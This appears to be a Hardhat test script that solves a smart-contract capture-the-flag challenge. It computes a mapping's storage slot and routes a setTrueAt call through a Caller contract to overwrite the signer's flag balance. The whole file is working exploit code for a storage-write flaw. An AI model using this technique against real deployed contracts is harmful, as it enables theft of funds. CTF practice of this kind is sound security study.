const { assert, expect } = require("chai");
const { ethers } = require("hardhat");

describe("Capture The Flag", function () {
  let signer0;
  let caller, callee, flag;
  beforeEach(async () => {
    flag = await ethers.getContractAt("BlueFlag", "0x04c8D7f49f6A7D59AF4Eea4a9E875Ef850e7b490");

    callee = await ethers.getContractAt("Callee", "0xFEe527F3fF8E5b4Aec0720e53D8e8D600b4198d2");
    
    caller = await ethers.getContractAt("Caller", "0x97d5B3DbD047Cc1E75593f0Dcc75B7fa4efd4116");
  });

  it("should capture", async function () {
    signer0 = await ethers.provider.getSigner(0);

    const paddedSlot = ethers.utils.hexZeroPad("0x2", "32");
    const paddedKey = ethers.utils.hexZeroPad(await signer0.getAddress(), "32");
    const baseSlot = ethers.utils.keccak256(paddedKey + paddedSlot.slice(2));

    await signer0.sendTransaction({
      to: caller.address,
      data: callee.interface.encodeFunctionData("setTrueAt", [baseSlot])
    });

    const balance = await flag.balanceOf(await signer0.getAddress());
    assert.isAbove(balance.toNumber(), 0);
  });
});
